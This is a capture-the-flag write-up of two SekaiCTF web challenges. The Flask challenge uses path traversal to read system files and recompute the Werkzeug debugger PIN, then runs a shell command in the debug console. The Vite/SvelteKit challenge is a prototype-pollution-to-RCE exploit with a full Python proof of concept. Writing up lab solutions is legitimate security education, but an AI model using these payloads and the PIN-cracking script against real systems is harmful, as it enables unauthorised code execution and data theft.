---
title: "SekaiCTF Writeups (Part 1)"
date: 2025-11-3
excerpt: "One of the hardest CTF competitions I have ever participated in"
tags:
  - sekaiCTF
  - prototype pollution
  - RCE
  - crack PIN console
  - path traversal
---
# My Flask App

## Challenge description

I created a Web application in Flask, what could be wrong?

## Exploitation

### 1. Challenge Analysis

Website interface

![alt text](/images/posts/SekaiCTF/MyFlaskApp/image.png)

Reading the code, in file `app/app.py` there is a **path traversal** vulnerability: route `/view` accepts `filename` parameter and opens the file directly without sanitization -> can read sensitive files on the system

![alt text](/images/posts/SekaiCTF/MyFlaskApp/image-2.png)

In `Dockerfile`, the flag file is renamed to `flag-<random string>.txt` and placed in the root directory

```dockerfile
# Dockerfile
RUN mv flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt
```
Because the flag filename cannot be guessed + `open()` function cannot list directories -> need RCE -> get flag filename -> read file

### 2. RCE vector

In file `app/app.py` Flask has debug mode enabled

```python
# app.py
app.run(host='0.0.0.0', port=5000, debug=True)
```
When `debug=True`, Flask provides an interactive console at path `/console`. However, it is protected by a PIN code.

![alt text](/images/posts/SekaiCTF/MyFlaskApp/image-3.png)

So we can use the **path traversal** vulnerability to read necessary system information, then recalculate the Flask Debugger PIN code. After unlocking the console, use Python to list directories and get the flag.

Reference [blog](https://b33pl0g1c.medium.com/hacking-the-debugging-pin-of-a-flask-application-7364794c4948).

The important point is that this challenge is using Python 3.11, with this version, Flask/Werkzeug uses SHA1 algorithm and different salt string so compared to the blog, need to adjust the PIN calculation algorithm to match this challenge.

### 3. Path Traversal Vulnerability

To complete the PIN calculation algorithm, need to obtain MAC Address and Machine ID values. These 2 values can be obtained through the **path traversal** vulnerability:

Payload to get MAC Address value:

```
URL: /view?filename=/sys/class/net/eth0/address
```

![alt text](/images/posts/SekaiCTF/MyFlaskApp/image-4.png)

Payload to get Machine ID value:

```
URL: /view?filename=/proc/sys/kernel/random/boot_id
```

![alt text](/images/posts/SekaiCTF/MyFlaskApp/image-5.png)

### 4. PIN Generation Script

```python
import hashlib
from itertools import chain

mac_raw = "fe:03:67:84:11:1a" # MAC address

machine_id = "8ca6d08f-0a0d-4a89-bc5d-168b5787ab5f" # Machine ID

mac_int = int(mac_raw.replace(':', ''), 16)

probably_public_bits = [
    'nobody',             # username
    'flask.app',          # modname
    'Flask',              # app name
    '/usr/local/lib/python3.11/site-packages/flask/app.py'        
]

private_bits = [
    str(mac_int),   
    machine_id           
]

h = hashlib.sha1() 
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)

h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(f"PIN: {rv}")
```

Run the script, the generated PIN is `973-712-045`

Successfully access the console

![alt text](/images/posts/SekaiCTF/MyFlaskApp/image-6.png)

### 5. Read Flag File

Run the following command in the console

```
import os; print(os.popen('cat /flag*.txt').read())
```
![alt text](/images/posts/SekaiCTF/MyFlaskApp/image-7.png)
---
# Vite

## Challenge description

A Vite web application challenge with no outgoing network access. Can you find a way to get the flag?

## Exploitation

### 1. Challenge Analysis

The challenge provides a web application using **Vite 6.2.6** and **SvelteKit 2.16.0**.

Website interface as shown

![alt text](/images/posts/SekaiCTF/vite/image.png)

**How the application is launched**

`Dockerfile`: Copy code to `/app`, install Node dependencies, install supervisor. When container runs, `entrypoint.sh` compiles assembly file `flag.s` into program `/flag` (only executable, not readable), then supervisor starts `npm run preview` on port 1337

`Supervisor`: Keeps Vite/SvelteKit preview process always running, auto-restart if crash

`vite.config.js`: Preview server listens on **0.0.0.0** (line 1337), `Host` only allows **.chals.sekai.team** (meaning need valid Host header when exploiting).

`svelte.config.js`: CSRF check disabled, so POST from any origin is allowed.

```js
csrf: {
    checkOrigin: false,
}
```

`routes/`: Only has default page "Welcome to SvelteKit", no special API.

`hooks.server.js`: All requests go through `form_data` middleware from library `sk-form-data`, specialized for parsing multipart/form-data. This is an important point because it processes user data earliest.

```js
import { form_data } from 'sk-form-data'

export const handle = form_data
```

`flag.s`: Program writes flag string to stdout when run; this file is compiled into `/flag` in the container.

### 2. Vulnerability Analysis

#### 2.1. Attack surface

All requests go through `hooks.server.js` with `form_data` middleware (library `sk-form-data` → `parse-nested-form-data@1.0.0`).

This library allows special key `__proto__` → **prototype pollution**: sending form-data `__proto__.something=...` will attach property to `Object.prototype.`

`svelte.config.js` disables CSRF (`csrf.checkOrigin=false`), so there is no Origin barrier.

#### 2.2. Finding gadget leading to RCE

SvelteKit/Vite preview when rendering error page will use dynamic code-gen mechanism, specifically getting the **source** property and passing it into `new Function(...)` to build renderer.

Because **source** is read from plain object, if prototype is polluted with `__proto__.source`, that value will be used instead of valid source → we can control the content executed by `new Function` on the server.

#### 2.3. Pollution → RCE

1. Pollute prototype: POST form-data with `__proto__.source = <JS payload>`.

2. Trigger error (404/500) to make SvelteKit render error page. During rendering, it calls `new Function` with **source** (inherited from prototype) → runs polluted payload.

3. Payload uses internal API `process.binding('spawn_sync')` to run `/flag`, get stdout:
```js
process.binding('spawn_sync').spawn({
  file:'/flag', args:['/flag'],
  stdio:[
    {type:'pipe', readable:true, writable:false},
    {type:'pipe', readable:false, writable:true},
    {type:'pipe', readable:false, writable:true},
  ]
}).output.toString()
```

4. Payload base64 encodes the result and assigns `Object.prototype.flag = btoa(output).
Exfiltration via header`

5. SvelteKit sets headers from response object; because prototype already has flag, inherited property is copied as flag header.
We just need to read flag header, decode base64 to get flag content.

### 3. PoC

```python
#!/usr/bin/env python3

import base64
import requests


BASE_URL = "http://127.0.0.1:1337"  # change to remote URL if needed


def build_payload() -> str:
    # Keep payload on a single line to avoid invalid header characters
    return (
        "Object.prototype.flag = btoa(process.binding('spawn_sync').spawn({"
        "file:'/flag',args:['/flag'],stdio:["
        "{type:'pipe',readable:!0,writable:!1},"
        "{type:'pipe',readable:!1,writable:!0},"
        "{type:'pipe',readable:!1,writable:!0}"
        "]}).output.toString())"
    )


def send_pollution(url: str) -> requests.Response:
    return requests.post(
        f"{url}/pmai",
        data={"__proto__.source": build_payload()},
        headers={"Origin": url}, 
        timeout=10,
        verify=False, 
    )


def extract_flag(resp: requests.Response) -> str | None:
    encoded = resp.headers.get("flag")
    if not encoded:
        return None
    try:
        return base64.b64decode(encoded).decode()
    except Exception:
        return None


def main() -> None:
    resp = send_pollution(BASE_URL)
    print(f"Status: {resp.status_code}")
    print(f"Headers: {dict(resp.headers)}")

    flag = extract_flag(resp)
    if flag:
        print(f"Flag: {flag}")
    else:
        print("Flag header not found. Check host, payload, or logs.")


if __name__ == "__main__":
    main()
```